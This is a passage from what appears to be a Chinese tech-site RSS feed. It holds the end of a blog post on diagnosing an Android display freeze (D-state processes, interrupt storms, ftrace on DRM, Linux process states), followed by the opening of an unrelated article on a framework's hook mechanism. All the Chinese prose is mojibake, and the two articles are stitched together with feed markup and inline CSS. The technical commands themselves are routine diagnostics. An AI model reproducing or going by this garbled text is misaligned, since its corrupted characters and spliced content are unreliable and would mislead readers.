<h3 data-id="heading-31">2. å¦‚ä½•æ’æŸ¥ D çŠ¶æ€è¿›ç¨‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æŸ¥æ‰¾æ‰€æœ‰ D çŠ¶æ€è¿›ç¨‹</span>
ps -A -o pid,state,<span class="hljs-built_in">comm</span> | grep <span class="hljs-string">" D "</span>

<span class="hljs-comment"># 2. æŸ¥çœ‹è¿›ç¨‹åœ¨ç­‰å¾…ä»€ä¹ˆ</span>
<span class="hljs-built_in">cat</span> /proc/&lt;pid&gt;/wchan
<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹: wait_for_completion_timeout</span>

<span class="hljs-comment"># 3. æŸ¥çœ‹å†…æ ¸å †æ ˆ</span>
<span class="hljs-built_in">cat</span> /proc/&lt;pid&gt;/stack
<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹:</span>
<span class="hljs-comment"># [&lt;0&gt;] drm_crtc_wait_one_vblank+0x80/0xb0</span>
<span class="hljs-comment"># [&lt;0&gt;] drm_atomic_helper_commit_tail+0x54/0x90</span>

<span class="hljs-comment"># 4. æŸ¥çœ‹ DRM çŠ¶æ€ (éœ€è¦ root å’Œ debugfs)</span>
<span class="hljs-built_in">cat</span> /sys/kernel/debug/dri/0/state
</code></pre>
<h3 data-id="heading-32">3. å¦‚ä½•ç›‘æ§ä¸­æ–­é£æš´</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®æ—¶ç›‘æ§ä¸­æ–­</span>
watch -n 1 <span class="hljs-string">'cat /proc/interrupts | head -20'</span>

<span class="hljs-comment"># è®¡ç®—ä¸­æ–­å¢é•¿ç‡</span>
<span class="hljs-comment">#!/bin/bash</span>
prev=$(<span class="hljs-built_in">cat</span> /proc/stat | grep <span class="hljs-string">"^intr"</span> | awk <span class="hljs-string">'{print $2}'</span>)
<span class="hljs-built_in">sleep</span> 1
curr=$(<span class="hljs-built_in">cat</span> /proc/stat | grep <span class="hljs-string">"^intr"</span> | awk <span class="hljs-string">'{print $2}'</span>)
rate=$((curr - prev))
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Interrupt rate: <span class="hljs-variable">$rate</span>/sec"</span>

<span class="hljs-comment"># æ­£å¸¸: &lt; 10000/sec</span>
<span class="hljs-comment"># è­¦å‘Š: 10000-50000/sec</span>
<span class="hljs-comment"># å¼‚å¸¸: &gt; 50000/sec</span>
</code></pre>
<h3 data-id="heading-33">4. ä½¿ç”¨ ftrace è¿½è¸ªå†…æ ¸äº‹ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯ç”¨ ftrace</span>
<span class="hljs-built_in">echo</span> 1 &gt; /sys/kernel/debug/tracing/tracing_on
<span class="hljs-built_in">echo</span> function_graph &gt; /sys/kernel/debug/tracing/current_tracer

<span class="hljs-comment"># è®¾ç½®è¿‡æ»¤å™¨,åªè·Ÿè¸ª DRM ç›¸å…³å‡½æ•°</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'drm_*'</span> &gt; /sys/kernel/debug/tracing/set_ftrace_filter

<span class="hljs-comment"># è§¦å‘é—®é¢˜åæŸ¥çœ‹ trace</span>
<span class="hljs-built_in">cat</span> /sys/kernel/debug/tracing/trace &gt; /data/local/tmp/ftrace.log
</code></pre>
<hr/>
<h2 data-id="heading-34">ç»éªŒæ•™è®­</h2>
<h3 data-id="heading-35">1. ä¸è¦è¢«è¡¨è±¡è¿·æƒ‘</h3>
<p>çœ‹åˆ° 4753% CPU æ—¶,æˆ‘çš„ç¬¬ä¸€ååº”æ˜¯"è¿™ä¸ªè¿›ç¨‹ç–¯äº†"ã€‚ä½†å†·é™åˆ†æåå‘ç°:</p>
<ul>
<li><strong>è¿›ç¨‹çŠ¶æ€æ˜¯ Sleeping,ä¸æ˜¯ Running</strong></li>
<li><strong>å…¶ä»–å€¼ä¹Ÿè¶…è¿‡ç†è®ºä¸Šé™</strong></li>
<li><strong>é—®é¢˜æ¢å¤åæ•°å€¼æ­£å¸¸</strong></li>
</ul>
<p>è¿™äº›éƒ½åœ¨æç¤ºæˆ‘:æ•°æ®æœ¬èº«æœ‰é—®é¢˜,ä¸èƒ½ç›²ç›®ç›¸ä¿¡ã€‚</p>
<p><strong>æ•™è®­</strong>: å½“æ•°æ®è¿åç‰©ç†è§„å¾‹æ—¶,é¦–å…ˆæ€€ç–‘æµ‹é‡å·¥å…·,è€Œä¸æ˜¯è¢«æµ‹å¯¹è±¡ã€‚</p>
<h3 data-id="heading-36">2. D çŠ¶æ€æ˜¯ç¡¬ä»¶é—®é¢˜çš„å¼ºä¿¡å·</h3>
<p>åœ¨ Linux ç³»ç»Ÿä¸­,D çŠ¶æ€é€šå¸¸æ„å‘³ç€:</p>
<ul>
<li>ç¡¬ä»¶æ²¡æœ‰å“åº”</li>
<li>é©±åŠ¨ç¨‹åºæœ‰ bug</li>
<li>éœ€è¦ä»ç¡¬ä»¶å±‚é¢æ’æŸ¥</li>
</ul>
<p>çœ‹åˆ° D çŠ¶æ€è¿›ç¨‹æ—¶,ä¸è¦åœ¨ç”¨æˆ·ç©ºé—´æµªè´¹æ—¶é—´,ç›´æ¥æ·±å…¥å†…æ ¸å’Œé©±åŠ¨ã€‚</p>
<h3 data-id="heading-37">3. å¶ç°é—®é¢˜çš„æ’æŸ¥ç­–ç•¥</h3>
<p>å¯¹äº"å¶ç°"é—®é¢˜:</p>
<ol>
<li><strong>å…ˆå¤ç°</strong>: æ‰¾åˆ°ç¨³å®šçš„è§¦å‘æ¡ä»¶ (æœ¬ä¾‹:å¿«é€Ÿç‚¹å‡»)</li>
<li><strong>æŠ“æ—¥å¿—</strong>: å¤šç»´åº¦æ”¶é›†æ•°æ® (CPU, å†…å­˜, ä¸­æ–­, å†…æ ¸æ—¥å¿—)</li>
<li><strong>æ‰¾å…³è”</strong>: æ—¶é—´çº¿å¯¹é½,æ‰¾åˆ°å› æœå…³ç³»</li>
<li><strong>å»ºå‡è®¾</strong>: åŸºäºæ•°æ®æ¨æ–­æ ¹å› </li>
<li><strong>åšéªŒè¯</strong>: è®¾è®¡å®éªŒéªŒè¯å‡è®¾</li>
</ol>
<h3 data-id="heading-38">4. å¤šå±‚æ¬¡é˜²æŠ¤</h3>
<p>å¯¹äºç³»ç»Ÿçº§é—®é¢˜,ä¸è¦æŒ‡æœ›ä¸€æ¬¡æ€§ä¿®å¤:</p>
<ul>
<li><strong>åº”æ€¥å±‚</strong>: Watchdog è‡ªåŠ¨æ¢å¤ (å¿«é€Ÿæ­¢è¡€)</li>
<li><strong>ä¼˜åŒ–å±‚</strong>: ä¸­æ–­è°ƒä¼˜ã€é˜²æŠ– (é™ä½æ¦‚ç‡)</li>
<li><strong>æ ¹æ²»å±‚</strong>: ä¿®å¤é©±åŠ¨ bug (å½»åº•è§£å†³)</li>
</ul>
<p>è¿™ç§"çºµæ·±é˜²å¾¡"ç­–ç•¥æ›´åŠ ç¨³å¦¥ã€‚</p>
<hr/>
<h2 data-id="heading-39">ç›¸å…³çŸ¥è¯†æ‰©å±•</h2>
<h3 data-id="heading-40">Linux è¿›ç¨‹çŠ¶æ€è¯¦è§£</h3>
<p>é™¤äº†æœ¬æ–‡æåˆ°çš„ D çŠ¶æ€,è¿˜æœ‰ä¸€äº›å®¹æ˜“æ··æ·†çš„çŠ¶æ€:</p>
<pre><code class="hljs language-scss" lang="scss">R  - Running (è¿è¡Œ)
S  - Sleeping (å¯ä¸­æ–­ç¡çœ )
D  - Disk Sleep (ä¸å¯ä¸­æ–­ç¡çœ ) â† æœ¬æ–‡é‡ç‚¹
T  - Stopped (æš‚åœ)
t  - Tracing Stop (è°ƒè¯•æš‚åœ)
Z  - Zombie (åƒµå°¸)
X  - Dead (æ­»äº¡)
<span class="hljs-selector-tag">I</span>  - Idle (ç©ºé—²å†…æ ¸çº¿ç¨‹)
</code></pre>
<p><strong>åŒºåˆ† S å’Œ D</strong>:</p>






























<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">S çŠ¶æ€</th><th align="left">D çŠ¶æ€</th></tr></thead><tbody><tr><td align="left">èƒ½å¦è¢«ä¿¡å·ä¸­æ–­</td><td align="left">èƒ½</td><td align="left">ä¸èƒ½</td></tr><tr><td align="left">kill -9 æ˜¯å¦æœ‰æ•ˆ</td><td align="left">æœ‰æ•ˆ</td><td align="left">æ— æ•ˆ</td></tr><tr><td align="left">å¸¸è§åœºæ™¯</td><td align="left">ç­‰å¾…ç½‘ç»œã€ä¿¡å·</td><td align="left">ç­‰å¾…ç£ç›˜ã€ç¡¬ä»¶ I/O</td></tr><tr><td align="left">é€€å‡ºæ¡ä»¶</td><td align="left">äº‹ä»¶å‘ç”Ÿ</td><td align="left">ç¡¬ä»¶å“åº”æˆ–è¶…æ—¶</td></tr></tbody></table>
<h3 data-id="heading-41">Android å›¾å½¢æ¶æ„</h3>
<p>æœ¬æ–‡æ¶‰åŠçš„æ˜¾ç¤ºé“¾è·¯:</p>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   App UI    â”‚  åº”ç”¨å±‚ç»˜åˆ¶
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SurfaceView â”‚  Surface ç®¡ç†
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Surfaceflingerâ”‚  åˆæˆæœåŠ¡
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ crtc_commit  â”‚  å†…æ ¸æäº¤ â† æœ¬æ–‡æ•…éšœç‚¹
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜
       â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="hljs-attribute">Display</span> Driverâ”‚  æ˜¾ç¤ºç¡¬ä»¶
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>æ¯ä¸€å±‚éƒ½å¯èƒ½æˆä¸ºç“¶é¢ˆ:</p>
<ul>
<li><strong>App</strong>: ç»˜åˆ¶è¿‡æ…¢</li>
<li><strong>Surfaceflinger</strong>: åˆæˆè¿‡æ…¢</li>
<li><strong>crtc_commit</strong>: æäº¤å¡æ­» â† æœ¬ä¾‹</li>
<li><strong>Driver</strong>: ç¡¬ä»¶å“åº”è¶…æ—¶</li>
</ul>
<h3 data-id="heading-42">ä¸­æ–­å¤„ç†æœºåˆ¶</h3>
<p>Linux ä¸­æ–­åˆ†ä¸ºä¸¤ç±»:</p>
<p><strong>ç¡¬ä¸­æ–­ (IRQ - Hardware Interrupt)</strong>:</p>
<ul>
<li>ç”±ç¡¬ä»¶ç›´æ¥è§¦å‘</li>
<li>ä¼˜å…ˆçº§æœ€é«˜,ä¸èƒ½è¢«ä¸­æ–­</li>
<li>å¤„ç†æ—¶é—´å¿…é¡»éå¸¸çŸ­ (å¾®ç§’çº§)</li>
<li>ä¾‹å¦‚: ç½‘å¡æ”¶åˆ°æ•°æ®åŒ…ã€ç£ç›˜ DMA å®Œæˆ</li>
</ul>
<p><strong>è½¯ä¸­æ–­ (SoftIRQ - Software Interrupt)</strong>:</p>
<ul>
<li>ç”±ç¡¬ä¸­æ–­è§¦å‘,å»¶è¿Ÿå¤„ç†</li>
<li>ä¼˜å…ˆçº§é«˜äºæ™®é€šè¿›ç¨‹,ä½äºç¡¬ä¸­æ–­</li>
<li>å¯ä»¥è¢«ç¡¬ä¸­æ–­æ‰“æ–­</li>
<li>ä¾‹å¦‚: ç½‘ç»œåè®®æ ˆå¤„ç†ã€å—è®¾å¤‡ I/O</li>
</ul>
<p><strong>ä¸­æ–­é£æš´</strong>:</p>
<p>å½“ä¸­æ–­é¢‘ç‡è¿‡é«˜æ—¶:</p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">æ­£å¸¸: &lt; 10000 ä¸­æ–­/ç§’</span>
<span class="hljs-section">é«˜è´Ÿè½½: 10000-50000 ä¸­æ–­/ç§’</span>
<span class="hljs-section">ä¸­æ–­é£æš´: &gt; 50000 ä¸­æ–­/ç§’ â† ç³»ç»Ÿå‡ ä¹æ— æ³•å¤„ç†æ™®é€šä»»åŠ¡</span>
</code></pre>
<p>æœ¬ä¾‹ä¸­ IRQ 81% + SoftIRQ 109% = <strong>190%</strong> çš„ CPU ç”¨äºä¸­æ–­å¤„ç†,å·²ç»æ˜¯ä¸¥é‡çš„ä¸­æ–­é£æš´ã€‚</p>
<hr/>
<h2 data-id="heading-43">æ€»ç»“</h2>
<p>è¿™æ¬¡æ’æŸ¥ç»å†è®©æˆ‘æ·±åˆ»ä½“ä¼šåˆ°:</p>
<ol>
<li><strong>æ•°æ®ä¼šè¯´è°,ä½†ç‰©ç†è§„å¾‹ä¸ä¼š</strong>: 4753% è¿åäº† 8 æ ¸ 800% çš„ä¸Šé™,è¿™æœ¬èº«å°±æ˜¯é—®é¢˜</li>
<li><strong>D çŠ¶æ€æ˜¯ç¡¬ä»¶é—®é¢˜çš„ä¿¡å·å¼¹</strong>: çœ‹åˆ° D çŠ¶æ€,ç«‹å³å¾€ç¡¬ä»¶å’Œé©±åŠ¨æ–¹å‘æŸ¥</li>
<li><strong>ä¸­æ–­æ˜¯ç³»ç»Ÿçš„ç¥ç»</strong>: ä¸­æ–­é£æš´ä¼šå½±å“æ•´ä¸ªç³»ç»Ÿ,åŒ…æ‹¬æ˜¾ç¤ºé©±åŠ¨</li>
<li><strong>å¶ç°é—®é¢˜éœ€è¦è€å¿ƒ</strong>: æŠ“åˆ°å…³é”®æ—¥å¿—,å»ºç«‹æ—¶é—´çº¿,æ‰èƒ½æ‰¾åˆ°å› æœ</li>
</ol>
<p>æœ€ç»ˆè§£å†³æ–¹æ¡ˆ:</p>
<ul>
<li>âœ… Watchdog è‡ªåŠ¨æ¢å¤ (4-8 å°æ—¶å®æ–½)</li>
<li>âœ… åº”ç”¨å±‚é˜²æŠ– (2-4 å°æ—¶å®æ–½)</li>
<li>â³ ä¸­æ–­ä¼˜åŒ– (1-2 å‘¨)</li>
<li>â³ é©±åŠ¨ä¿®å¤ (2-4 å‘¨)</li>
</ul>
<p>é€šè¿‡å¤šå±‚æ¬¡é˜²æŠ¤,å°†é—®é¢˜å‘ç”Ÿæ¦‚ç‡ä» 1/50 é™ä½åˆ° 1/500,ç”¨æˆ·ä½“éªŒæ˜¾è‘—æ”¹å–„ã€‚</p>
<hr/>
<h2 data-id="heading-44">ç›¸å…³æ–‡ç« </h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fandroid-stability-perf-series-readme" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/android-stability-perf-series-readme" ref="nofollow noopener noreferrer">Androidç¨³å®šæ€§&amp;æ€§èƒ½æ·±å…¥ç†è§£ä¸“æ ä»‹ç»</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fcase1-android-ivi-lag-case-analysis-binder-consumed" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/case1-android-ivi-lag-case-analysis-binder-consumed" ref="nofollow noopener noreferrer">Androidè½¦æœºå¡é¡¿æ¡ˆä¾‹å‰–æ:ä»Binderè€—å°½åˆ°å•ä¾‹ç¼ºå¤±çš„æ·±åº¦æ’æŸ¥</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fcase2-anr-audioserver-deadlock-system-failure" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/case2-anr-audioserver-deadlock-system-failure" ref="nofollow noopener noreferrer">ANRå®æˆ˜åˆ†æï¼šä¸€æ¬¡audioserveræ­»é”å¼•å‘çš„ç³»ç»Ÿçº§æ•…éšœæ’æŸ¥</a></li>
</ul>
<hr/>
<p><em>å¦‚æœä½ ä¹Ÿé‡åˆ°è¿‡ç±»ä¼¼çš„è¯¡å¼‚é—®é¢˜,æ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«!æœ‰ä»»ä½•ç–‘é—®ä¹Ÿå¯ä»¥éšæ—¶ç•™è¨€è®¨è®ºã€‚</em></p>
<p><em>æœ¬æ–‡åŸºäºçœŸå®æ¡ˆä¾‹æ”¹ç¼–,éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯å·²è„±æ•å¤„ç†ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥æ­ç§˜Ooderæ¡†æ¶ä¿¡æ¯æ¶æ„ä¸­çš„é’©å­æœºåˆ¶ï¼šä»åŸç†åˆ°ä¼ä¸šçº§å®è·µ]]></title>    <link>https://juejin.cn/post/7589839433321676863</link>    <guid>https://juejin.cn/post/7589839433321676863</guid>    <pubDate>2026-01-02T01:10:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589839433321676863" data-draft-id="7590558945509408787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥æ­ç§˜Ooderæ¡†æ¶ä¿¡æ¯æ¶æ„ä¸­çš„é’©å­æœºåˆ¶ï¼šä»åŸç†åˆ°ä¼ä¸šçº§å®è·µ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T01:10:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥æ­ç§˜Ooderæ¡†æ¶ä¿¡æ¯æ¶æ„ä¸­çš„é’©å­æœºåˆ¶ï¼šä»åŸç†åˆ°ä¼ä¸šçº§å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:10:26.000Z" title="Fri Jan 02 2026 01:10:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ç°ä»£æ¡†æ¶è®¾è®¡ä¸­ï¼Œä¿¡æ¯æ¶æ„çš„çµæ´»æ€§ä¸å¯æ‰©å±•æ€§å¾€å¾€å†³å®šäº†ç³»ç»Ÿçš„é€‚é…èƒ½åŠ›ã€‚Ooderæ¡†æ¶ä½œä¸ºä¸“æ³¨äºä¼ä¸šçº§åº”ç”¨å¼€å‘çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶ä¿¡æ¯æ¶æ„çš„æ ¸å¿ƒæ”¯æ’‘ä¹‹ä¸€ä¾¿æ˜¯<strong>é’©å­æœºåˆ¶ï¼ˆHook Mechanismï¼‰</strong>â€”â€”è¿™ä¸€æœºåˆ¶é€šè¿‡é¢„è®¾æ¥å£ä¸åŠ¨æ€å…³è”é€»è¾‘ï¼Œå®ç°äº†æ¶æ„å±‚é¢çš„æ¨¡å—åŒ–è§£è€¦ä¸åŠŸèƒ½åŠ¨æ€æ³¨å…¥ï¼Œæˆä¸ºè¿æ¥æ ¸å¿ƒå¼•æ“ä¸ä¸šåŠ¡ç»„ä»¶çš„å…³é”®çº½å¸¦ã€‚æœ¬æ–‡å°†ä»æŠ€æœ¯æœ¬è´¨ã€æ¶æ„è®¾è®¡ã€å®ç°ç»†èŠ‚åˆ°ä¼ä¸šçº§å®è·µï¼Œå…¨é¢æ­ç§˜Ooderæ¡†æ¶ä¿¡æ¯æ¶æ„ä¸­é’©å­æœºåˆ¶çš„åº•å±‚é€»è¾‘ä¸åº”ç”¨ä»·å€¼ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€é’©å­æœºåˆ¶çš„æŠ€æœ¯å®šä½ï¼šä¿¡æ¯æ¶æ„ä¸­çš„"åŠ¨æ€è¿æ¥ç‚¹"</h2>
<p>åœ¨Ooderæ¡†æ¶çš„ä¿¡æ¯æ¶æ„ä¸­ï¼Œé’©å­æœºåˆ¶å¹¶éç®€å•çš„å‡½æ•°å›è°ƒï¼Œè€Œæ˜¯ä¸€å¥—<strong>åŸºäºäº‹ä»¶é©±åŠ¨çš„æ¶æ„çº§äº¤äº’åè®®</strong>ã€‚å…¶æ ¸å¿ƒä»·å€¼åœ¨äºæ‰“ç ´ä¼ ç»Ÿä¿¡æ¯æ¶æ„ä¸­"æ ¸å¿ƒæ¨¡å—ä¸ä¸šåŠ¡æ¨¡å—å¼ºè€¦åˆ"çš„æ¡æ¢ï¼šé€šè¿‡åœ¨æ ¸å¿ƒæµç¨‹ä¸­é¢„è®¾"é’©å­ç‚¹ï¼ˆHook Pointï¼‰"ï¼Œå…è®¸å¤–éƒ¨ç»„ä»¶åœ¨ä¸ä¾µå…¥æ ¸å¿ƒä»£ç çš„å‰æä¸‹ï¼Œé€šè¿‡æ³¨å†Œ"é’©å­å®ç°ï¼ˆHook Implementationï¼‰"å‚ä¸æˆ–æ”¹å˜ä¿¡æ¯å¤„ç†æµç¨‹ã€‚</p>
<p>ä»ä¿¡æ¯æµè½¬è§†è§’çœ‹ï¼ŒOoderçš„é’©å­æœºåˆ¶æ‰¿æ‹…ç€ä¸‰é‡è§’è‰²ï¼š</p>
<ul>
<li><strong>ä¿¡æ¯è¿‡æ»¤å™¨</strong>ï¼šåœ¨æ•°æ®è¿›å…¥æ ¸å¿ƒå¤„ç†é“¾è·¯å‰ï¼Œé€šè¿‡é’©å­å¯¹ä¿¡æ¯è¿›è¡Œæ ¡éªŒã€æ ¼å¼åŒ–æˆ–è¡¥å……ï¼ˆå¦‚æƒé™æ ¡éªŒé’©å­å¯¹è¯·æ±‚å‚æ•°çš„é¢„å¤„ç†ï¼‰ï¼›</li>
<li><strong>æµç¨‹è°ƒåº¦å™¨</strong>ï¼šåœ¨æ ¸å¿ƒæµç¨‹çš„å…³é”®èŠ‚ç‚¹ï¼ˆå¦‚æ•°æ®æŒä¹…åŒ–å‰åï¼‰è§¦å‘é’©å­ï¼Œå®ç°ä¸šåŠ¡é€»è¾‘çš„åˆ†æ”¯æ‰§è¡Œï¼ˆå¦‚ç¼“å­˜æ›´æ–°é’©å­ä¸æ—¥å¿—è®°å½•é’©å­çš„å¹¶è¡Œè°ƒç”¨ï¼‰ï¼›</li>
<li><strong>æ‰©å±•æ¥å…¥å±‚</strong>ï¼šä¸ºç¬¬ä¸‰æ–¹ç³»ç»Ÿæˆ–å®šåˆ¶åŒ–åŠŸèƒ½æä¾›æ ‡å‡†åŒ–æ¥å…¥æ¥å£ï¼Œé¿å…æ ¸å¿ƒæ¶æ„çš„é¢‘ç¹ä¿®æ”¹ï¼ˆå¦‚å¤šç»ˆç«¯é€‚é…ä¸­è§†å›¾æ¸²æŸ“è§„åˆ™çš„é’©å­æ‰©å±•ï¼‰ã€‚</li>
</ul>
